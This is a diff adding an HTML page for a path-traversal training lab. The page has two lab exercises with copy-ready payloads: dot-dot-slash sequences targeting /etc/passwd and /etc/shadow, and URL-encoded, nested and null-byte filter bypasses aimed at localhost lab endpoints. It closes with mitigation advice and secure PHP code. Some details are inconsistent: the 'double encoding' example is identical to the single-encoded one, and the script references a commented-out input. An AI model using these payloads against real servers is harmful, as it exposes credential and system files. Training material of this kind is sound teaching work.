@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Path Traversal Vulnerability Lab</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #0f1219;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            color: #e8eef2;
+            line-height: 1.5;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: #1a1f2e;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.6);
+            border: 1px solid #2a3142;
+        }
+
+        /* Header - Exact match to image */
+        h1 {
+            color: #ff4d4d;
+            font-size: 32px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            letter-spacing: -0.5px;
+            border-left: 4px solid #ff4d4d;
+            padding-left: 15px;
+        }
+
+        .metadata {
+            display: flex;
+            gap: 15px;
+            margin: 15px 0 25px 0;
+            flex-wrap: wrap;
+        }
+
+        .difficulty {
+            background: #262d3e;
+            color: #ffaa33;
+            padding: 6px 14px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            border: 1px solid #ffaa33;
+            display: inline-block;
+        }
+
+        .risk {
+            background: #262d3e;
+            color: #ff4d4d;
+            padding: 6px 14px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            border: 1px solid #ff4d4d;
+            display: inline-block;
+        }
+
+        .time {
+            background: #262d3e;
+            color: #4caf50;
+            padding: 6px 14px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            border: 1px solid #4caf50;
+            display: inline-block;
+        }
+
+        /* Attack Surface - Exact match */
+        .attack-surface {
+            background: #1e2436;
+            border-left: 4px solid #ff4d4d;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .attack-surface h3 {
+            color: #ff4d4d;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .attack-surface p {
+            color: #b4b9c9;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+
+        /* Objective section - Exact match */
+        .objective {
+            background: #1e2436;
+            border: 2px solid #ff4d4d;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 8px;
+        }
+
+        .objective h3 {
+            color: #ff4d4d;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+        }
+
+        .objective p {
+            color: #b4b9c9;
+            font-size: 15px;
+            margin-bottom: 15px;
+        }
+
+        .objective .verification-text {
+            color: #ffaa33;
+            font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Roboto Mono', monospace;
+            font-size: 14px;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid #2a3142;
+        }
+
+        /* Target Host Section */
+        .target-host {
+            background: #1e2436;
+            border: 1px solid #2a3142;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 8px;
+        }
+
+        .target-host label {
+            display: block;
+            color: #8e95a8;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .target-host input {
+            width: 100%;
+            background: #0f1219;
+            border: 1px solid #2a3142;
+            padding: 12px 16px;
+            color: #e8eef2;
+            border-radius: 4px;
+            font-size: 15px;
+            font-family: 'SF Mono', Monaco, monospace;
+            margin-bottom: 10px;
+        }
+
+        .target-host input:focus {
+            outline: none;
+            border-color: #ff4d4d;
+        }
+
+        .target-host .example {
+            color: #6e7687;
+            font-size: 13px;
+            font-style: italic;
+        }
+
+        /* Execute Button - Exact match */
+        .execute-btn {
+            background: #ff4d4d;
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            font-size: 16px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            margin: 20px 0;
+            transition: background 0.2s;
+        }
+
+        .execute-btn:hover {
+            background: #ff6666;
+        }
+
+        /* Verification Status - Exact match */
+        .verification-status {
+            background: #1e2436;
+            border: 1px solid #ffaa33;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 8px;
+            color: #ffaa33;
+        }
+
+        .verification-status .pending {
+            color: #ffaa33;
+            font-weight: 500;
+        }
+
+        .verification-status .file-name {
+            font-family: 'SF Mono', Monaco, monospace;
+            font-size: 14px;
+            color: #b4b9c9;
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid #2a3142;
+        }
+
+        /* Definition Section */
+        .definition-section {
+            background: #1e2436;
+            border: 1px solid #2a3142;
+            padding: 25px;
+            margin: 30px 0;
+            border-radius: 8px;
+        }
+
+        .definition-section h2 {
+            color: #ff4d4d;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #2a3142;
+        }
+
+        .definition-section h3 {
+            color: #ffaa33;
+            font-size: 18px;
+            margin: 20px 0 10px;
+        }
+
+        .definition-section p {
+            color: #b4b9c9;
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
+
+        .code-block {
+            background: #0f1219;
+            padding: 15px;
+            border-radius: 6px;
+            font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Roboto Mono', monospace;
+            color: #4caf50;
+            margin: 15px 0;
+            border-left: 3px solid #ff4d4d;
+            overflow-x: auto;
+            font-size: 14px;
+        }
+
+        /* Lab Sections */
+        .lab-section {
+            background: #1e2436;
+            border: 1px solid #2a3142;
+            padding: 25px;
+            margin: 30px 0;
+            border-radius: 8px;
+        }
+
+        .lab-section h2 {
+            color: #ff4d4d;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #2a3142;
+        }
+
+        .lab-box {
+            background: #0f1219;
+            border: 1px solid #2a3142;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 6px;
+        }
+
+        .lab-box h3 {
+            color: #ffaa33;
+            font-size: 18px;
+            margin-bottom: 15px;
+        }
+
+        .solution-box {
+            background: #1a1f2e;
+            border: 1px solid #2a3142;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 6px;
+        }
+
+        .solution-box h4 {
+            color: #4caf50;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .payload {
+            background: #0f1219;
+            padding: 12px 15px;
+            border-radius: 4px;
+            color: #ffaa33;
+            font-family: 'SF Mono', Monaco, monospace;
+            font-size: 14px;
+            margin: 10px 0;
+            border-left: 3px solid #ffaa33;
+            word-break: break-all;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .payload:hover {
+            background: #1e2436;
+        }
+
+        .steps {
+            color: #b4b9c9;
+            padding-left: 25px;
+            margin: 15px 0;
+        }
+
+        .steps li {
+            margin: 10px 0;
+            line-height: 1.6;
+        }
+
+        .lab-button {
+            background: #ff4d4d;
+            color: white;
+            border: none;
+            padding: 14px 25px;
+            font-size: 15px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 20px 0 10px 0;
+            transition: background 0.2s;
+            display: inline-block;
+            text-decoration: none;
+        }
+
+        .lab-button:hover {
+            background: #ff6666;
+        }
+
+        .note {
+            color: #6e7687;
+            font-size: 13px;
+            font-style: italic;
+            margin-top: 10px;
+        }
+
+        /* Mitigation Table */
+        .mitigation-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+
+        .mitigation-table th {
+            background: #ff4d4d;
+            color: white;
+            padding: 12px;
+            text-align: left;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .mitigation-table td {
+            border: 1px solid #2a3142;
+            padding: 12px;
+            color: #b4b9c9;
+            font-size: 14px;
+        }
+
+        .mitigation-table tr:hover {
+            background: #1e2436;
+        }
+
+        hr {
+            border: none;
+            border-top: 2px solid #2a3142;
+            margin: 20px 0;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 26px;
+            }
+            
+            .metadata {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header - Exact match to image -->
+	<h1> Path Traversal / Directory Traversal</h1>
+        <!-- <h1># Infrastructure Connectivity Analyzer</h1> -->
+        
+        <div class="metadata">
+            <span class="difficulty">Difficulty: Easy</span>
+            <span class="risk">Risk Level: Critical</span>
+            <!-- <span class="time">Est. Time: 5-10 min</span> -->
+        </div>
+
+        <hr>
+
+        <!-- Attack Surface Context - Exact match -->
+        <!-- <div class="attack-surface">
+            <h3>Attack Surface Context</h3>
+            <p>This diagnostic interface integrates directly with backend file system utilities for file access and retrieval. Improper input handling may expose path traversal risks through unauthenticated user input passed to file system operations. Attackers can exploit this to access sensitive files and create arbitrary files on the server.</p>
+        </div> -->
+
+        <!-- Objective - Exact match -->
+        <!-- <div class="objective">
+            <h3> Objective</h3>
+            <p>Verification Task: Create a file named <code style="color: #ffaa33;">var/www/html/request.js</code> via the exposed path traversal vulnerability.<br>
+            System will automatically detect and validate successful exploitation.</p>
+            
+            <div class="verification-text">
+                <strong>Target Host (IP/Domain)</strong><br>
+                e.g., 8.8.8.8, gregile.com, localhost:5000<br>
+                <span style="color: #6e7687;">Test various input patterns to observe system behavior and identify injection opportunities.</span>
+            </div> 
+        </div> -->
+
+        <!-- Target Host Input -->
+        <!-- <div class="target-host">
+            <label>Target Host (IP/Domain)</label>
+            <input type="text" id="targetHost" value="http://localhost:5000" placeholder="e.g., 8.8.8.8, gregile.com">
+            <div class="example">Example: http://localhost:5000, https://vulnerable-app.com</div>
+        </div> -->
+
+        <!-- What is Path Traversal? -->
+        <div class="definition-section">
+            <h2> What is Path Traversal?</h2>
+            <p>Path Traversal (Directory Traversal) is a web security vulnerability that allows attackers to access files and directories stored outside the web root folder. By manipulating variables that reference files with "dot-dot-slash (../)" sequences and encoded variations, attackers can access arbitrary files on the server.</p>
+            
+            <h3>Common Targets:</h3>
+            <div class="code-block">
+                ../../../etc/passwd # Linux user accounts<br>
+                ../../../etc/shadow # Linux password hashes<br>
+                ../../../../var/www/html/config.php # Web config files<br>
+                ../../../var/www/html/request.js # Target file
+            </div>
+        </div>
+
+        <!-- LAB 1: Basic Path Traversal -->
+        <div class="lab-section">
+            <h2> LAB 1: Basic Path Traversal (../../../ sequence)</h2>
+            
+            <div class="lab-box">
+                <h3> Vulnerable Endpoint: File Viewer (No Input Validation)</h3>
+                <p style="color: #b4b9c9; margin-bottom: 15px;">This endpoint directly uses user input in file operations without any validation, making it vulnerable to basic path traversal attacks.</p>
+                
+                <div class="code-block">
+                    Vulnerable URL Pattern:<br>
+                    http://127.0.0.1:5000<br>
+                    Example: http://localhost:5000/backend/easy.php?file=avatar.jpg
+                </div>
+
+                <!-- Solution for Lab 1 -->
+                <div class="solution-box">
+                    <h4>  SOLUTION: Basic Path Traversal</h4>
+                    
+                    <p><strong style="color: #ffaa33;">Objective:</strong> Follow the Instructions <code style="color: #ffaa33;"></code></p>
+                    <p><strong style="color: #b4b9c9;">Step 1:</strong> Right Click on a image and open in new tab</p> 
+                    <p><strong style="color: #b4b9c9;">Step 2:</strong> First, determine the correct depth of traversal:</p>
+		    <div class="payload" onclick="copyPayload(this)">Try : "/"</div>
+                    <div class="payload" onclick="copyPayload(this)">/etc/passwd</div>
+                    <div class="payload" onclick="copyPayload(this)">/etc/os-release</div>
+                    <!-- <div class="payload" onclick="copyPayload(this)">../../../../../etc/passwd</div> -->
+                    
+                    <p><strong style="color: #b4b9c9;">Step 2:</strong> Once you confirm it works, try other files</p>
+                    <div class="payload" onclick="copyPayload(this)">try /opt/ or /etc/ or /bin</div>
+                    
+                    <p><strong style="color: #b4b9c9;">Step 3:</strong> Find the flag.txt </p>
+                    <div class="payload" onclick="copyPayload(this)">http://127.0.0.1:5000/display?image=?file=../flag.txt # You may need to add multiple ../../ to get the flag</div>
+
+                    <h4 style="color: #ffaa33; margin-top: 20px;"> Step-by-Step Exploitation:</h4>
+                    <ol class="steps">
+                        <li><strong>Identify the Entry Point : </strong> The user looks at the website URL and notices it asks for a specific file, like ?image=tool1.jpg </li>
+                        <li><strong>Test the Boundaries : </strong> The user tries to change the filename to ../flag.txt to see if the server will look "outside" the images folder </li>
+                        <li><strong>Climb the Folders : </strong>The user adds more sets of ../ one by one (like climbing a ladder) until they reach the exact folder depth where the flag is hidden</li>
+                        <li><strong>Read the Secret : </strong>Since the code blindly follows the path ../../../../flag.txt, the server leaves the "safe" web area, finds the secret file on the hard driv</li>
+                    </ol>
+
+                    <p style="color: #6e7687; margin-top: 15px;"> <strong>Tip:</strong> Click any payload to copy it to clipboard</p>
+                </div>
+
+                <!-- Button to vulnerable lab -->
+                <a href="http://127.0.0.1:7001" target="_blank" class="lab-button" id="lab1Button">
+                     GO TO LAB 1 - BASIC PATH TRAVERSAL
+                </a>
+                <div class="note">Note: Update the URL in the Target Host field above if your lab is at a different address</div>
+            </div>
+        </div>
+
+        <!-- LAB 2: Encoded Path Traversal -->
+        <div class="lab-section">
+            <h2> LAB 2: Encoded Path Traversal (URL Encoding Bypass)</h2>
+            
+            <div class="lab-box">
+                <h3> Vulnerable Endpoint: Medium Security (Basic Filtering)</h3>
+                <p style="color: #b4b9c9; margin-bottom: 15px;">This endpoint has basic filtering that removes "../" sequences. You need to use encoding techniques to bypass the filter.</p>
+                
+                <div class="code-block">
+                    Vulnerable URL Pattern:<br>
+                    http://localhost:7000/backend/medium.php?file=FILENAME<br>
+                    Filter: Removes "../" sequences (can be bypassed)
+                </div>
+
+                <!-- Solution for Lab 2 -->
+                <div class="solution-box">
+                    <h4>  SOLUTION: Encoded Path Traversal</h4>
+                    
+                    <p><strong style="color: #ffaa33;">Objective:</strong> Create file at <code style="color: #ffaa33;">/var/www/html/request.js</code> (bypass filter)</p>
+                    
+                    <p><strong style="color: #b4b9c9;">URL Encoding Reference:</strong></p>
+                    <div class="code-block">
+                        . (dot) = %2E<br>
+                        / (slash) = %2F<br>
+                        .. = %2E%2E<br>
+                        ../ = %2E%2E%2F
+                    </div>
+                    
+                    <p><strong style="color: #b4b9c9;">Method 1: Single URL Encoding</strong></p>
+                    <div class="payload" onclick="copyPayload(this)">..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Frequest.js</div>
+                    <div class="payload" onclick="copyPayload(this)">http://localhost:7000/backend/medium.php?file=..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Frequest.js</div>
+                    
+                    <p><strong style="color: #b4b9c9;">Method 2: Double Encoding (if single encoded is filtered)</strong></p>
+                    <div class="payload" onclick="copyPayload(this)">..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Frequest.js</div>
+                    
+                    <p><strong style="color: #b4b9c9;">Method 3: Nested Traversal (bypass ../ removal)</strong></p>
+                    <div class="payload" onclick="copyPayload(this)">....//....//....//....//var/www/html/request.js</div>
+                    
+                    <p><strong style="color: #b4b9c9;">Method 4: Mixed Encoding + Null Byte</strong></p>
+                    <div class="payload" onclick="copyPayload(this)">..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Frequest.js%00.jpg</div>
+
+                    <h4 style="color: #ffaa33; margin-top: 20px;"> Step-by-Step Bypass Techniques:</h4>
+                    <ol class="steps">
+                        <li><strong>Test filter:</strong> Try basic ../../../etc/passwd </li>
+                        <li><strong>Single encode:</strong> Use URL encoded version %2E%2E%2F</li>
+                        <li><strong>Double encode:</strong> If single encoded is blocked, try %2E%2E%2F</li>
+                        <li><strong>Nested:</strong> Try ....//....// pattern (filter removes ../ but misses ....//)</li>
+                        <li><strong>Null byte:</strong> Add %00 to truncate any appended extensions</li>
+                    </ol>
+
+                    <p style="color: #6e7687; margin-top: 15px;"> <strong>Tip:</strong> Test each method until one works. Different servers have different filters.</p>
+                </div>
+
+                <!-- Button to vulnerable lab -->
+                <a href="http://127.0.0.1:7002" target="_blank" class="lab-button" id="lab2Button">
+                     GO TO LAB 2 - ENCODED PATH TRAVERSAL
+                </a>
+                <div class="note">Note: Update the URL in the Target Host field above if your lab is at a different address</div>
+            </div>
+        </div>
+
+        <!-- Execute Connectivity Test Button -->
+        <!--<button class="execute-btn" onclick="testExploit()">  EXECUTE CONNECTIVITY TEST</button> -->
+
+        <!-- Verification Status - Exact match -->
+        <!--<div class="verification-status">
+            <div class="pending">  Verification Pending</div>
+            <div class="file-name">@Objective file not detected - Complete Lab 1 or Lab 2 to create /var/www/html/request.js</div>
+        </div> -->
+
+        <!-- Mitigation Techniques -->
+        <div class="definition-section">
+            <h2>  How to Mitigate Path Traversal</h2>
+            
+            <table class="mitigation-table">
+                <tr>
+                    <th>Technique</th>
+                    <th>Implementation</th>
+                </tr>
+                <tr>
+                    <td><strong>Input Validation</strong></td>
+                    <td class="code-block" style="margin:0">if (preg_match('/^[a-zA-Z0-9_\-\.]+$/', $file)) { ... }</td>
+                </tr>
+                <tr>
+                    <td><strong>Path Canonicalization</strong></td>
+                    <td class="code-block" style="margin:0">$real = realpath('/base/dir/' . $file);<br>if (strpos($real, '/base/dir') !== 0) { die(); }</td>
+                </tr>
+                <tr>
+                    <td><strong>Whitelist Files</strong></td>
+                    <td class="code-block" style="margin:0">$allowed = ['file1.txt', 'file2.jpg'];<br>if (!in_array($file, $allowed)) { die(); }</td>
+                </tr>
+                <tr>
+                    <td><strong>Database Storage</strong></td>
+                    <td class="code-block" style="margin:0">Store files as BLOBs in database<br>Access via ID, not filename</td>
+                </tr>
+            </table>
+
+            <h3 style="margin-top: 25px;">Secure Code Example:</h3>
+            <div class="code-block">
+                // Secure file access<br>
+                function getFile($filename) {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;// Whitelist characters<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;if (!preg_match('/^[a-z0-9_\-\.]+$/i', $filename)) {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return "Invalid";<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}<br><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;// Base directory<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;$base = '/var/www/html/uploads/';<br><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;// Canonicalize<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;$path = realpath($base . $filename);<br><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;// Verify path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;if ($path === false || strpos($path, $base) !== 0) {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return "Denied";<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}<br><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;return file_get_contents($path);<br>
+                }
+            </div>
+        </div>
+
+        <hr>
+
+        <div style="color: #6e7687; text-align: center; padding: 20px; font-size: 13px;">
+             Educational Purpose Only - Never test on systems without permission
+        </div>
+    </div>
+
+    <script>
+        // Update lab buttons when target host changes
+        document.getElementById('targetHost').addEventListener('input', function(e) {
+            let host = e.target.value.trim();
+            if (host && !host.startsWith('http')) {
+                host = 'http://' + host;
+            }
+            
+            document.getElementById('lab1Button').href = host + '/backend/easy.php?file=avatar.jpg';
+            document.getElementById('lab2Button').href = host + '/backend/medium.php?file=avatar.jpg';
+        });
+
+        // Copy payload to clipboard
+        function copyPayload(element) {
+            const text = element.textContent.trim();
+            navigator.clipboard.writeText(text).then(() => {
+                const originalText = element.textContent;
+                element.textContent = '  Copied!';
+                element.style.backgroundColor = '#1a472a';
+                element.style.color = '#4caf50';
+                
+                setTimeout(() => {
+                    element.textContent = originalText;
+                    element.style.backgroundColor = '#0f1219';
+                    element.style.color = '#ffaa33';
+                }, 1500);
+            });
+        }
+
+        // Test exploit function
+        function testExploit() {
+            const host = document.getElementById('targetHost').value.trim() || 'http://localhost:7000';
+            
+            const message = `Testing for Path Traversal Vulnerability
+
+Try these requests in your browser or Burp Suite:
+
+LAB 1 (Basic):
+${host}/backend/easy.php?file=../../../../var/www/html/request.js
+
+LAB 2 (Encoded):
+${host}/backend/medium.php?file=..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Frequest.js
+
+LAB 2 (Double Encoded):
+${host}/backend/medium.php?file=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fvar%2Fwww%2Fhtml%2Frequest.js
+
+After successful exploitation, refresh this page to see verification.`;
+
+            alert(message);
+        }
+
+        // Check if file exists (simulated - in real implementation, this would check your backend)
+        function checkFileExists() {
+            // This is a simulated check - in reality, you'd make an AJAX call to your backend
+            const verificationDiv = document.querySelector('.verification-status');
+            
+            // Simulated check - replace with actual AJAX call to verify file creation
+            // For demo purposes, we'll just show how it would look when successful
+            
+            // Uncomment for actual implementation:
+            /*
+            fetch('http://localhost:7000/backend/check-file.php?file=request.js')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.exists) {
+                        verificationDiv.innerHTML = `
+                            <div class="pending" style="color: #4caf50;">鉁  Verification Successful</div>
+                            <div class="file-name" style="color: #4caf50;">@Objective file detected: /var/www/html/request.js created</div>
+                        `;
+                    }
+                });
+            */
+        }
+
+        // Auto-update on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set initial button URLs
+            const host = document.getElementById('targetHost').value;
+            document.getElementById('lab1Button').href = host + '/backend/easy.php?file=avatar.jpg';
+            document.getElementById('lab2Button').href = host + '/backend/medium.php?file=avatar.jpg';
+        });
+    </script>
+</body>
+</html>
